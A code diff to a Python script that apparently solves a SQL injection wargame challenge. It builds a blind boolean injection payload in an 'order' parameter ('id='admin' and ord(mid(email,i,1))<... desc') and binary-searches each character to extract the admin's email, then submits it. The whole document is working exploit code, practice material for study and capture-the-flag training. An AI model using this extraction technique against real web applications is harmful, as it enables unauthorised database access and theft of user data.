@@ -48,11 +48,18 @@ def main():
 
     print(len_of_key)
 
-    payload = "id='admin' and ord(mid(email,%s,1))%s desc"
-    param = dict(order=payload)
-    result = los.find_binary(url, param, check_func,
-                             32, 127, len_of_key, cook)
+    result = ''
+    num_of_requests = 0
+    for i in range(1, len_of_key + 1):
+        payload = f"id='admin' and ord(mid(email,{i},1))<%s desc"
+        param = dict(order=payload)
+        left, num_requests = los.find_binary(url, param, check_func,
+                                             32, 127, cook)
+        print(chr(left))
+        result += chr(left)
+        num_of_requests += num_requests
 
+    print('num_of_requests:', num_of_requests)
     param = dict(email=result)
     response = los.get_request(url, param, cook)
 
